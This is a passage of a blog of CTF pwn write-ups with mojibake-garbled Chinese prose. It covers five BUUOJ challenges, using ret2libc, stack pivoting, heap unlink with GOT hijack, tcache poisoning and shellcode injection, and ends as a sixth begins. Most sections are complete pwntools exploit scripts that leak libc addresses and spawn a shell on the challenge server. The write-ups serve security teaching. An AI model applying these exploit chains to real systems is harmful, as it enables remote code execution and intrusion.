<h2 id="0x048-actf-2019-babystack-ret2libc-stack-migration"><a href="#0x048-actf-2019-babystack-ret2libc-stack-migration" class="headerlink" title="0x048.actf_2019_babystack - ret2libc + stack migration"></a>0x048.actf_2019_babystack - ret2libc + stack migration</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/04/06/UrikdPeSnIzv9AX.png" alt="image.png"><img src="https://i.loli.net/2021/04/06/UrikdPeSnIzv9AX.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œæœ‰æº¢å‡ºï¼Œä½†æ˜¯åªæœ‰0x10å­—èŠ‚ï¼Œç™½ç»™æ ˆä¸Šåœ°å€ï¼Œè€ƒè™‘æ ˆè¿ç§»</p>
<p><img src="https://i.loli.net/2021/04/06/idnF9bLfq36jN1e.png" alt="image.png"></p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25625</span>)<span class="comment">#process(&#x27;./ACTF_2019_babystack&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line">offset = <span class="number">0xd0</span></span><br><span class="line">leave_ret = e.search(asm(<span class="string">&#x27;leave ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">ret = e.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your message will be saved at &quot;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.send((<span class="string">b&#x27;arttnba3&#x27;</span> + p64(pop_rdi_ret) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x4008F6</span>)).ljust(offset, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack_leak) + p64(leave_ret))</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your message will be saved at &quot;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.send((<span class="string">b&#x27;arttnba3&#x27;</span> + p64(ret) + p64(pop_rdi_ret) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])).ljust(offset, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack_leak) + p64(leave_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/06/d9q3CKFTQkajZl2.png" alt="image.png"></p>
<h2 id="0x049-hitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget"><a href="#0x049-hitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget" class="headerlink" title="0x049.hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget"></a>0x049.hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨â€¦åªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/04/06/fhCpAXLSK7rTHVs.png" alt="image.png"></p>
<p>æ‹–å…¥IDA è¿›è¡Œåˆ†æ</p>
<p>æ²¡æœ‰èœå•æç¤ºçš„èœå•é¢˜ï¼ˆæ¼ï¼‰</p>
<p>å¤§æ¦‚æ˜¯æœ‰åˆ†é…ã€é‡Šæ”¾ã€ç¼–è¾‘å †å—åŠŸèƒ½</p>
<p><img src="https://i.loli.net/2021/04/06/uBYpC2mdAWy4ilF.png" alt="image.png"></p>
<p>æ¼æ´åœ¨äºç¼–è¾‘é•¿åº¦è‡ªå®šï¼Œå­˜åœ¨å †æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/07/2tXSkUziY7hIL9y.png" alt="image.png"></p>
<p>æ²¡æœ‰æ‰“å°åŠŸèƒ½ï¼Œæ²¡æœ‰ tcache ä¹Ÿéš¾æ•´ä»»æ„åœ°å€å†™ï¼ˆfastbin sizeæ£€æŸ¥ï¼‰ï¼Œé‚£å°±åªèƒ½é€šè¿‡unlinkåŠ«æŒgotè¡¨äº†ï¼ˆæ¼ï¼‰</p>
<p>å¤§æ¦‚æ˜¯æ„é€ å¦‚ä¸‹å †å¸ƒå±€ï¼ˆè¡¨æ ¼æœ‰ç‚¹ä¸‘ï¼Œå°†å°±ç€çœ‹ï¼ˆxï¼‰ï¼‰ï¼Œå› ä¸ºå­˜æ”¾å †æŒ‡é’ˆçš„æ•°ç»„åœ¨bssæ®µä¸Šï¼Œæ²¡å¼€PIEï¼Œé‚£æˆ‘ä»¬ç›´æ¥ç”¨ unlink åŠ«æŒgotè¡¨å³å¯</p>
<table>
<thead>
<tr>
<th align="right">address</th>
<th align="right">prev_size</th>
<th align="right">size</th>
</tr>
</thead>
<tbody><tr>
<td align="right">chunk2</td>
<td align="right">0</td>
<td align="right">0x31</td>
</tr>
<tr>
<td align="right">(fake chunk)</td>
<td align="right">0</td>
<td align="right">0x21</td>
</tr>
<tr>
<td align="right"></td>
<td align="right">&amp;chunk_array[2] - 0x18</td>
<td align="right">&amp;chunk_array[2] - 0x10</td>
</tr>
<tr>
<td align="right">chunk3</td>
<td align="right">0x20</td>
<td align="right">0x90</td>
</tr>
<tr>
<td align="right"></td>
<td align="right">â€¦</td>
<td align="right">â€¦</td>
</tr>
</tbody></table>
<p>å¤§æ¦‚èƒ½å¤Ÿæ»¡è¶³ <code>fake chunk-&gt;FD-&gt;BK = fake chunk</code> å’Œ <code>fake chunk-&gt;BK-&gt;FD = fake chunk</code> ï¼Œæ­¤æ—¶ free(chunk3)ï¼Œç”±äº prev_in_use ä½ä¸º 0ï¼Œæˆ‘ä»¬çš„ fake chunk å°±ä¼šè¢«åˆå¹¶åˆ°chunk3ä¸­</p>
<p>æ¥ä¸‹æ¥çš„ unlink æ“ä½œä¼šå°†<code>fake chunk-&gt;FD-&gt;BK</code> èµ‹å€¼ä¸º<code>fake chunk-&gt;BK</code>ï¼Œå°†<code>fake chunk-&gt;BK-&gt;FD</code> èµ‹å€¼ä¸º<code>fake chunk-&gt;FD</code></p>
<p>å³<strong>å­˜æ”¾</strong> <code>chunk2</code> <strong>æŒ‡é’ˆçš„ä½ç½®å­˜æ”¾çš„æŒ‡é’ˆå˜æˆäº†</strong> <code>&amp;chunk_array[2] - 0x18</code> <strong>çš„åœ°å€</strong>ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥ç›´æ¥ä¿®æ”¹ <code>chunk_array</code> ä¸­æŒ‡é’ˆï¼ŒåŠ«æŒ got è¡¨ä¸€å¥—å¸¦èµ°</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27629</span>)<span class="comment">#process(&#x27;./stkof&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span> ,size:<span class="built_in">int</span> ,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x20</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x80</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx 4</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x602140</span> + <span class="number">0x10</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602140</span> + <span class="number">0x10</span> - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x602138</span>) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x602138</span>) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/87TAZSdY15jgbIP.png" alt="image.png"></p>
<h2 id="0x04A-ciscn-2019-es-1-Use-After-Free-tcache-poisoning"><a href="#0x04A-ciscn-2019-es-1-Use-After-Free-tcache-poisoning" class="headerlink" title="0x04A.ciscn_2019_es_1 - Use After Free + tcache poisoning"></a>0x04A.ciscn_2019_es_1 - Use After Free + tcache poisoning</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/07/ZaHXOWpYDhPAFJ7.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯æœ‰ç€åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p>
<p>æ¼æ´ç‚¹åœ¨äºé‡Šæ”¾æ—¶æŒ‡é’ˆæœªç½®0ï¼Œå­˜åœ¨ UAFï¼ˆ<del>æš—ç¤º996çš„å…¬å¸æ°¸è¿œä¸å¯èƒ½è¢«çœŸæ­£æ¶ˆç­</del>ï¼ˆâ†ğŸ”«</p>
<p><img src="https://i.loli.net/2021/04/07/vk6zEGilmgOD9aw.png" alt="image.png"></p>
<p>libc 2.27ï¼Œæ²¡æœ‰ double freeæ£€æµ‹ï¼Œå¥—æ¿å­ä¸€å¥—å¸¦èµ°ï¼ˆæ„Ÿè§‰ç°åœ¨å¤§éƒ¨åˆ†é¢˜ç›®éƒ½æ˜¯å¥—æ¿å­aâ€¦ï¼‰</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27368</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the size of compary&#x27;s name&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please input name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please input compary call:&quot;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(heap_base + <span class="number">0x10</span>)) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\x07&#x27;</span> * <span class="number">0xf</span>) <span class="comment"># idx 5, hijack the tcache</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/Lm26WXhGQRPFAdC.png" alt="image.png"></p>
<h2 id="0x04B-cmcc-pwnme2-ret2libc"><a href="#0x04B-cmcc-pwnme2-ret2libc" class="headerlink" title="0x04B.cmcc_pwnme2 - ret2libc"></a>0x04B.cmcc_pwnme2 - ret2libc</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/04/07/zFetDIXT972JlHw.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰gets()æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/07/61bcLnEpiZ5ChHq.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/04/07/5Pk39C6BqvlJNux.png" alt="image.png"></p>
<p>å¥—æ¿å­ ret2libc å³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26415</span>)<span class="comment">#process(&#x27;./pwnme2&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwnme2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/32bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6c</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) * <span class="number">2</span> + p32(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/OtIHPzCk6ylZNSB.png" alt="image.png"></p>
<h2 id="0x04C-picoctf-2018-shellcode-shellcode"><a href="#0x04C-picoctf-2018-shellcode-shellcode" class="headerlink" title="0x04C.picoctf_2018_shellcode - shellcode"></a>0x04C.picoctf_2018_shellcode - shellcode</h2><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯ä¼šæ‰§è¡Œæˆ‘ä»¬çš„è¾“å…¥</p>
<p><img src="https://i.loli.net/2021/04/07/8rZpNe32YAG49Vw.png" alt="image.png"></p>
<p>è¾“ä¸€æ®µshellcodeå³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27170</span>)<span class="comment">#</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/P1MynRDfKtHBchN.png" alt="image.png"></p>
<h2 id="0x04D-npuctf-2020-easyheap-off-by-one"><a href="#0x04D-npuctf-2020-easyheap-off-by-one" class="headerlink" title="0x04D.npuctf_2020_easyheap - off by one"></a>0x04D.npuctf_2020_easyheap - off by one</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨â€¦åªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/04/07/4wHohrKNgT5OlyI.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯æœ‰ç€åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p>
<p><img src="https://i.loli.net/2021/04/07/sSMY4UHKVZkPzvp.png" alt="image.png"></p>
<p> é™åˆ¶äº†åˆ†é…çš„ chunk çš„å¤§å°ä¸º 0x18&#x2F;0x38</p>
<p><img src="https://i.loli.net/2021/04/07/lFBJthf9W8siZdc.png" alt="image.png"></p>
<p>ä½¿ç”¨å¦‚ä¸‹ç»“æ„ä½“å­˜å‚¨ä¸€ä¸ª chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_CHUNK_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">void</span> * chunk_ptr;</span><br><span class="line">&#125;chunk;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘æ—¶å¯ä»¥æº¢å‡º 1 å­—èŠ‚</p>
<p><img src="https://i.loli.net/2021/04/07/9pxBiuPVl3esbkw.png" alt="image.png"></p>
<p>åŸæœ¬æƒ³ç”¨ unlink åšçš„ï¼Œåé¢å‘ç°å‡ºä¸æ¥â€¦é‚£å°±åªèƒ½èµ°å¸¸è§„çš„ chunk overlapping äº†</p>
